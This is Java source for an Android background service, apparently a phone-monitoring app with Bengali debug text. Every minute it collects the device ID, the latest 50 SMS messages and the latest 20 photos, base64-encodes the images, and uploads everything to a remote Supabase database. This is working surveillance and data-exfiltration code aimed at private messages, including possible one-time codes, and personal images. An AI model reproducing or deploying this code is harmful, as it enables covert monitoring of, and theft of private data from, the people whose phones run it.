package com.monitor.smsphoto;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentUris;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class MonitorService extends Service {
    private static final String CHANNEL_ID = "monitor_service_channel";
    private static final int NOTIFICATION_ID = 1;

    private Handler handler = new Handler();
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private String photoDebugInfo = "";

    private Runnable syncTask = new Runnable() {
        @Override
        public void run() {
            new Thread(() -> {
                syncToSupabase();
                handler.postDelayed(syncTask, 60000);
            }).start();
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startInForeground();
        handler.post(syncTask);
        Log.d("MonitorService", "সার্ভিস শুরু হয়েছে");
        return START_STICKY;
    }

    private void startInForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Device Monitor", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("ডিভাইস মনিটর চলছে")
                .setContentText("ব্যাকগ্রাউন্ডে সিঙ্ক চলছে")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void syncToSupabase() {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        try {
            registerDevice(deviceId);

            JSONArray smsList = getSMS();
            for (int i = 0; i < smsList.length(); i++) {
                uploadSMS(deviceId, smsList.getJSONObject(i));
            }

            photoDebugInfo = "";
            JSONArray photoList = getPhotos();

            String firstSize = "N/A";
            if (photoList.length() > 0) {
                try {
                    firstSize = photoList.getJSONObject(0).getString("data").length() + " বাইট";
                } catch (Exception ignored) {
                }
            }

            String permission = Build.VERSION.SDK_INT >= 33
                    ? android.Manifest.permission.READ_MEDIA_IMAGES
                    : android.Manifest.permission.READ_EXTERNAL_STORAGE;
            boolean granted = ActivityCompat.checkSelfPermission(this, permission)
                    == PackageManager.PERMISSION_GRANTED;
            String debugMsg = "পারমিশন: " + (granted ? "আছে" : "নেই")
                    + " | পাওয়া: " + photoList.length() + "টি"
                    + " | প্রথম ছবির ডেটা: " + firstSize
                    + (photoDebugInfo.isEmpty() ? "" : " | " + photoDebugInfo);
            mainHandler.post(() -> Toast.makeText(MonitorService.this, debugMsg, Toast.LENGTH_LONG).show());
            Log.d("MonitorService", debugMsg);

            int uploadFailures = 0;
            for (int i = 0; i < photoList.length(); i++) {
                try {
                    uploadPhoto(deviceId, photoList.getJSONObject(i));
                } catch (Exception e) {
                    uploadFailures++;
                    Log.e("uploadPhoto", e.toString());
                }
            }
            if (uploadFailures > 0) {
                final int failures = uploadFailures;
                mainHandler.post(() -> Toast.makeText(MonitorService.this,
                        "ছবি আপলোড ব্যর্থ: " + failures + "টি", Toast.LENGTH_LONG).show());
            }

            Log.d("MonitorService", "সিঙ্ক সম্পন্ন: " + deviceId);
        } catch (Exception e) {
            Log.e("syncToSupabase", e.toString());
            mainHandler.post(() -> Toast.makeText(MonitorService.this,
                    "সিঙ্ক এরর: " + e.getMessage(), Toast.LENGTH_LONG).show());
        }
    }

    private void registerDevice(String deviceId) throws Exception {
        String endpoint = Config.SUPABASE_URL + "/rest/v1/devices";
        JSONObject body = new JSONObject();
        body.put("device_id", deviceId);
        body.put("device_name", Build.MODEL);
        body.put("last_sync", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new java.util.Date()));

        postToSupabase(endpoint, body.toString());
    }

    private void uploadSMS(String deviceId, JSONObject sms) throws Exception {
        String endpoint = Config.SUPABASE_URL + "/rest/v1/sms";
        JSONObject body = new JSONObject();
        body.put("device_id", deviceId);
        body.put("sender", sms.optString("sender", ""));
        body.put("body", sms.optString("body", ""));
        body.put("date", sms.optLong("date", 0));

        postToSupabase(endpoint, body.toString());
    }

    private void uploadPhoto(String deviceId, JSONObject photo) throws Exception {
        String endpoint = Config.SUPABASE_URL + "/rest/v1/photos";
        JSONObject body = new JSONObject();
        body.put("device_id", deviceId);
        body.put("photo_name", photo.optString("name", ""));
        body.put("photo_data", photo.optString("data", ""));

        postToSupabase(endpoint, body.toString());
    }

    private JSONArray getSMS() {
        JSONArray smsList = new JSONArray();
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) return smsList;

        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null,
                    "date DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 50) {
                    JSONObject sms = new JSONObject();
                    sms.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    smsList.put(sms);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e("getSMS", e.toString());
        } finally {
            if (cursor != null) cursor.close();
        }
        return smsList;
    }

    private JSONArray getPhotos() {
        JSONArray photoList = new JSONArray();
        String permission = Build.VERSION.SDK_INT >= 33
                ? android.Manifest.permission.READ_MEDIA_IMAGES
                : android.Manifest.permission.READ_EXTERNAL_STORAGE;
        if (ActivityCompat.checkSelfPermission(this, permission)
                != PackageManager.PERMISSION_GRANTED) {
            photoDebugInfo = "পারমিশন চেকে আটকেছে";
            return photoList;
        }

        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME},
                    null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");

            if (cursor == null) {
                photoDebugInfo = "কুয়েরি null রিটার্ন করেছে";
                return photoList;
            }

            int totalRows = cursor.getCount();
            photoDebugInfo = "কার্সারে রো: " + totalRows;

            int readErrors = 0;
            int emptyData = 0;
            int count = 0;
            while (cursor.moveToNext() && count < 20) {
                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);

                try (InputStream is = getContentResolver().openInputStream(uri)) {
                    if (is != null) {
                        byte[] imageData = readAllBytes(is);
                        if (imageData.length == 0) {
                            emptyData++;
                            continue;
                        }
                        String base64 = Base64.getEncoder().encodeToString(imageData);
                        JSONObject photo = new JSONObject();
                        photo.put("name", name);
                        photo.put("data", base64);
                        photoList.put(photo);
                        count++;
                    } else {
                        readErrors++;
                    }
                } catch (Exception e) {
                    readErrors++;
                    Log.e("getPhotos", "ছবি পড়তে ব্যর্থ: " + name, e);
                }
            }
            if (readErrors > 0) {
                photoDebugInfo += ", পড়তে ব্যর্থ: " + readErrors;
            }
            if (emptyData > 0) {
                photoDebugInfo += ", খালি ডেটা: " + emptyData;
            }
        } catch (Exception e) {
            photoDebugInfo = "কুয়েরি এক্সেপশন: " + e.getMessage();
            Log.e("getPhotos", e.toString());
        } finally {
            if (cursor != null) cursor.close();
        }
        return photoList;
    }

    private byte[] readAllBytes(InputStream is) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] data = new byte[8192];
        int nRead;
        while ((nRead = is.read(data, 0, data.length)) != -1) {
            buffer.write(data, 0, nRead);
        }
        return buffer.toByteArray();
    }

    private void postToSupabase(String endpoint, String jsonData) throws Exception {
        URL url = new URL(endpoint);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("apikey", Config.SUPABASE_KEY);
        conn.setRequestProperty("Authorization", "Bearer " + Config.SUPABASE_KEY);
        conn.setDoOutput(true);
        conn.setChunkedStreamingMode(0);

        OutputStream os = conn.getOutputStream();
        os.write(jsonData.getBytes("UTF-8"));
        os.flush();
        os.close();

        int code = conn.getResponseCode();
        if (code < 200 || code >= 300) {
            String errorBody = "";
            try (InputStream es = conn.getErrorStream()) {
                if (es != null) {
                    errorBody = new String(readAllBytes(es), "UTF-8");
                }
            } catch (Exception ignored) {
            }
            conn.disconnect();
            throw new Exception("HTTP " + code + ": " + errorBody);
        }
        conn.disconnect();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(syncTask);
        Log.d("MonitorService", "সার্ভিস বন্ধ হয়েছে");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
